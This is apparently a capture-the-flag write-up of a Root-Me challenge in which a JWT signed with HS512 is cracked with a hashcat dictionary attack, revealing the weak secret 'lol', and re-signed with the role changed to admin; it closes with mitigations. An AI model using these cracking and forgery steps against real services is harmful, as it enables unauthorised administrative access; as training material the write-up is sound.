---
title: Weak JWT Signing Secret Allows JWT Forgery
draft: true
tags:
  - A07
  - CWE-1391
  - CWE-321
  - CWE-287
---

> [!info]
> JWT Forgery via Weak HS512 Secret

![[Pasted image 20260811163407.png]]
## Overview

In this challenge, the target application uses JSON Web Token (JWT) for authentication and authorization.

The goal was to analyze the JWT implementation, identify weaknesses in the signing mechanism, recover the secret key, and generate a forged token with administrator privileges.

The vulnerability was caused by using a weak JWT signing secret with the HS512 algorithm.

## Target

Endpoint:

```

POST /web-serveur/ch59/admin

```

Host:

```

challenge01.root-me.org

````

---

## Initial Request

The first attempt was sending the JWT token inside the request body:

```http
POST /web-serveur/ch59/admin HTTP/1.1
Host: challenge01.root-me.org

{
 "JWT_TOKEN"
}
````

The server response:

```json
{
 "message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"
}
```

> [!warning]  
> The server was not reading the token from the request body. It expected the JWT inside the `Authorization` HTTP header.

---

## Sending JWT Correctly

The request was modified:

```http
POST /web-serveur/ch59/admin HTTP/1.1
Host: challenge01.root-me.org
Authorization: Bearer <JWT>
```

The server accepted the token format and returned:

```json
{
 "message": "I was right, you are not able to break my super crypto! I use HS512 so no need to have a strong secret!"
}
```

---

## JWT Analysis

A JWT consists of three parts:

```
Header.Payload.Signature
```

The original token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9
.
eyJyb2xlIjoiZ3Vlc3QifQ
.
4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
```

---

## Header Decode

The JWT header:

```json
{
 "typ": "JWT",
 "alg": "HS512"
}
```

The signing algorithm:

```
HS512
```

is:

```
HMAC-SHA512
```

---

## Payload Decode

The payload contains:

```json
{
 "role": "guest"
}
```

The current privilege level:

```
guest
```

---

## JWT Signature Process

The signature is generated from:

```
Base64URL(Header)
+
Base64URL(Payload)

        |
        v

HMAC-SHA512(secret)

        |
        v

Signature
```

Without knowing the secret key, creating a valid signature is not possible.

---

## Vulnerability Discovery

The server response contained an important hint:

```
I use HS512 so no need to have a strong secret!
```

This assumption is incorrect.

HS512 only defines the cryptographic algorithm. The security of the JWT also depends on the strength of the secret key.

A strong algorithm with a weak secret is still insecure.

Example:

```
Algorithm:
HS512

Secret:
lol
```

---

## Recovering the JWT Secret

Hashcat was used to perform a dictionary attack against the JWT signing secret.

JWT hash mode:

```
16500
```

Command:

```bash
hashcat -hh | grep -i jwt
16500 | JWT (JSON Web Token) | Network Protocol 
hashcat -m 16500 -a 0 fil.txt /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260804153317.png]]

## Exploitation

After recovering the secret, the JWT payload was modified.

Original payload:

```json
{
 "role": "guest"
}
```

Modified payload:

```json
{
 "role": "admin"
}
```

The new token was signed using:

```
Algorithm: HS512
Secret: lol
```

This generated a valid JWT signature.

---

## Sending the Forged Token

The forged JWT was sent using:

```http
Authorization: Bearer <FORGED_JWT>
```

Because the signature was generated with the correct secret, the server accepted the modified claims.

---

> [!danger]  
> Root Cause

The application uses a weak JWT signing secret.

The secret:

```
lol
```

can easily be recovered using dictionary attacks.

An attacker who obtains the secret can generate valid JWT tokens and modify authorization claims.

---

## Attack Flow

```
Weak JWT Secret

        |

Dictionary Attack

        |

Secret Recovery

        |

JWT Signature Forgery

        |

Authentication Bypass

        |

Privilege Escalation
```

---

> [!warning]  
> Impact

An attacker can:

- Forge valid JWT tokens.
    
- Modify user roles.
    
- Bypass authentication controls.
    
- Gain unauthorized administrative access.
    

---

> [!success]  
> Mitigation

- Use a strong randomly generated JWT secret.
    
- Store secrets securely using a secret management solution.
    
- Rotate JWT signing keys periodically.
    
- Always validate JWT signatures server-side.
    
- Do not rely only on JWT claims without verifying the signature.
    

---

## Key Takeaways

- HS512 is not insecure by itself.
    
- The weakness was the poor choice of signing secret.
    
- JWT payloads are only encoded, not encrypted.
    
- A valid signature is required to modify JWT claims.
    
- A weak secret allows complete JWT forgery.